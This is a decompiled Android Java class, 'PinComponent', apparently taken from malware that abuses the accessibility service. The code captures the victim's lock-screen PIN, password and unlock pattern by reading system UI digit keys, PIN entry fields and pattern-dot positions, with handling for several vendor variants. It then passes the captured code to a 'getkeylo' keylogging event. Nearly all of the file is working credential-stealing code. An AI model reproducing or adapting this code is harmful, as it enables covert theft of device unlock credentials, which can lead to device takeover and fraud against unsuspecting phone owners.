package com.tillekesoft.accessibilityservices;

import android.content.Context;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.collections.Map;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/* loaded from: classes.dex */
public class PinComponent extends SdkComponent {
    public static volatile boolean enteringOwnPin;
    public static final List<PatternDot> patternList = new ArrayList();
    private static String pinCode = "";
    private static AccessibilityNodeInfo pinEditTextNode = null;
    private static boolean requestPin = false;
    public static boolean requestPinHandled = false;
    private int drawPatternDuration = 1000;
    public boolean isSetNewPasswordRequest = true;
    public final AtomicBoolean isUnlockingInProgress = new AtomicBoolean(false);
    long lastSwipeTime = 0;
    Handler patternHandler = new Handler();
    Runnable patternRunnable = new Runnable() { // from class: com.tillekesoft.accessibilityservices.PinComponent.1
        @Override // java.lang.Runnable
        public void run() {
            if (PinComponent.this.isSetNewPasswordRequest) {
                PinComponent.this.isSetNewPasswordRequest = false;
                if (PinComponent.patternList.isEmpty()) {
                    return;
                }
                PinComponent.this.sendPatternCode();
            }
        }
    };
    private long requestPinTime = 0;
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private ArrayList<String> patternViewList = new ArrayList<>(Arrays.asList("com.android.systemui:id/lockPatternView", "com.android.systemui:id/colorLockPatternView", "com.android.settings:id/lockPattern"));
    Handler pinHandler = new Handler();
    Runnable pinRunnable = new Runnable() { // from class: com.tillekesoft.accessibilityservices.PinComponent.3
        @Override // java.lang.Runnable
        public void run() {
            if (PinComponent.this.isSetNewPasswordRequest) {
                PinComponent.this.isSetNewPasswordRequest = false;
                PinComponent.this.sendPinCode();
            }
        }
    };

    public void sendPatternCode() {
        List<PatternDot> list = patternList;
        if (!list.isEmpty()) {
            Iterator<PatternDot> it = list.iterator();
            String str = "";
            while (it.hasNext()) {
                str = str + it.next().getNumber() + " ";
            }
            Timber.m23d("!!!!!", "pinCode - " + str);
        }
        patternList.clear();
    }

    public boolean isPinRequested() {
        return System.currentTimeMillis() - this.requestPinTime < 5000;
    }

    public anywheresoftware.b4a.objects.collections.List checkPattern(AccessibilityEvent accessibilityEvent) {
        List<AccessibilityNodeInfo> patternNodes;
        if (accessibilityEvent == null || accessibilityEvent.getSource() == null || (patternNodes = getPatternNodes(accessibilityEvent)) == null || patternNodes.isEmpty()) {
            return null;
        }
        return readPattern(patternNodes);
    }

    private anywheresoftware.b4a.objects.collections.List readPattern(List<AccessibilityNodeInfo> list) {
        anywheresoftware.b4a.objects.collections.List list2 = new anywheresoftware.b4a.objects.collections.List();
        list2.Initialize();
        int i = 0;
        AccessibilityNodeInfo accessibilityNodeInfo = list.get(0);
        int i2 = 0;
        for (int i3 = 0; i3 < accessibilityNodeInfo.getChildCount(); i3++) {
            if (!accessibilityNodeInfo.getChild(i3).isClickable()) {
                i2++;
            }
        }
        if (i2 == 1) {
            List<PatternDot> list3 = patternList;
            if (list3.size() > 1) {
                list3.clear();
            }
        }
        for (int i4 = 0; i4 < accessibilityNodeInfo.getChildCount(); i4++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i4);
            if (!child.isClickable()) {
                Rect rectFromNoteInfo = getRectFromNoteInfo(child);
                PatternDot patternDot = new PatternDot(rectFromNoteInfo.centerX(), rectFromNoteInfo.centerY(), i4 + 1, System.currentTimeMillis());
                List<PatternDot> list4 = patternList;
                if (!list4.contains(patternDot)) {
                    list4.add(patternDot);
                }
            }
            patternList.sort(new Comparator<PatternDot>() { // from class: com.tillekesoft.accessibilityservices.PinComponent.2
                @Override // java.util.Comparator
                public int compare(PatternDot patternDot2, PatternDot patternDot3) {
                    return (int) (patternDot2.getTs() - patternDot3.getTs());
                }
            });
        }
        if (patternList.size() > 0) {
            while (true) {
                List<PatternDot> list5 = patternList;
                if (i >= list5.size()) {
                    break;
                }
                PatternDot patternDot2 = list5.get(i);
                Map map = new Map();
                map.Initialize();
                map.Put("left", Integer.valueOf(patternDot2.getCoordinateX()));
                map.Put("top", Integer.valueOf(patternDot2.getCoordinateY()));
                map.Put("number", Integer.valueOf(patternDot2.getNumber()));
                list2.Add(map);
                i++;
            }
        }
        return list2;
    }

    private Rect getRectFromNoteInfo(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return null;
        }
        Rect rect = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect);
        return rect;
    }

    private static void setDefaultFlagsValue() {
        requestPin = false;
        requestPinHandled = false;
    }

    public List<AccessibilityNodeInfo> getPatternNodes(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent.getSource() == null) {
            return null;
        }
        Iterator<String> it = this.patternViewList.iterator();
        while (it.hasNext()) {
            List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = accessibilityEvent.getSource().findAccessibilityNodeInfosByViewId(it.next());
            if (findAccessibilityNodeInfosByViewId != null && !findAccessibilityNodeInfosByViewId.isEmpty()) {
                return findAccessibilityNodeInfosByViewId;
            }
        }
        return null;
    }

    public void sendPinCode() {
        TextUtils.isEmpty(pinCode);
        pinCode = "";
        pinEditTextNode = null;
    }

    private void savePinCode(Context context, String str, BA BA) {
        try {
            BA.Log("str : " + str);
            BA.raiseEvent2(this, true, "getkeylo", true, str);
        } catch (Exception e) {
            BA.Log("ex : " + e.getMessage().toString());
        }
    }

    public void checkPinCode(String str, AccessibilityEvent accessibilityEvent, AccessibilityEventsListenerWrapper accessibilityEventsListenerWrapper, BA BA) {
        pinCode = "";
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        if (str == null || source == null || !str.equalsIgnoreCase("com.android.systemui") || accessibilityEvent.getEventType() != 1) {
            return;
        }
        AccessibilityNodeInfo pinEditTextNode2 = getPinEditTextNode(source, accessibilityEventsListenerWrapper);
        if ((!TextUtils.isEmpty(source.getViewIdResourceName()) && source.getViewIdResourceName().contains("com.android.systemui:id/key")) || AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(source, "com.android.systemui:id/digit_text", true) != null || AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(source, "com.android.systemui:id/vivo_digit_text", true) != null) {
            if (AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(source, "com.android.systemui:id/digit_text", true) != null) {
                source = AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(source, "com.android.systemui:id/digit_text", true);
            } else if (AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(source, "com.android.systemui:id/vivo_digit_text", true) != null) {
                source = AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(source, "com.android.systemui:id/vivo_digit_text", true);
            }
            if (enteringOwnPin) {
                return;
            }
            String charSequence = source.getContentDescription() != null ? source.getContentDescription().toString() : "";
            if (TextUtils.isEmpty(charSequence) && source.getText() != null) {
                charSequence = source.getText().toString();
            }
            if (pinEditTextNode2 != null && !TextUtils.isEmpty(pinEditTextNode2.getText())) {
                pinCode = pinEditTextNode2.getText().toString();
            } else if (charSequence.length() == 1) {
                pinCode += charSequence;
            }
            if (pinCode.length() > 0) {
                savePinCode(accessibilityEventsListenerWrapper, pinCode + " -pkg : LOCK Screen", BA);
                return;
            }
            return;
        }
        if (source == null || !source.getViewIdResourceName().contains("com.android.systemui:id/delete_button")) {
            return;
        }
        if (pinEditTextNode2 != null && !TextUtils.isEmpty(pinEditTextNode2.getText())) {
            pinCode = pinEditTextNode2.getText().toString();
        } else if (pinCode.length() > 0) {
            String str2 = pinCode;
            pinCode = str2.substring(0, str2.length() - 1);
        }
        if (pinCode.length() > 0) {
            savePinCode(accessibilityEventsListenerWrapper, pinCode + " -pkg : LOCK Screen", BA);
        }
    }

    private AccessibilityNodeInfo getPinEditTextNode(AccessibilityNodeInfo accessibilityNodeInfo, AccessibilityEventsListenerWrapper accessibilityEventsListenerWrapper) {
        if (AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(accessibilityNodeInfo, "com.android.systemui:id/pinEntry", true) == null && AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(accessibilityNodeInfo, "com.android.systemui:id/fixedPinEntry", true) == null && AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(accessibilityNodeInfo, "com.android.systemui:id/passwordEntry", true) == null && AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(accessibilityNodeInfo, "com.android.systemui:id/vivo_pin_edittext", true) == null) {
            return null;
        }
        AccessibilityNodeInfo findAndGetFirstSimilar = AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(accessibilityNodeInfo, "com.android.systemui:id/pinEntry", true);
        if (findAndGetFirstSimilar == null) {
            findAndGetFirstSimilar = AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(accessibilityNodeInfo, "com.android.systemui:id/fixedPinEntry", true);
        }
        if (findAndGetFirstSimilar == null) {
            findAndGetFirstSimilar = AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(accessibilityNodeInfo, "com.android.systemui:id/passwordEntry", true);
        }
        if (findAndGetFirstSimilar == null) {
            findAndGetFirstSimilar = AccessibilityEventsListenerWrapper.findAndGetFirstSimilar(accessibilityNodeInfo, "com.android.systemui:id/vivo_pin_edittext", true);
        }
        if (findAndGetFirstSimilar != null) {
            pinEditTextNode = findAndGetFirstSimilar;
        }
        return pinEditTextNode;
    }
}
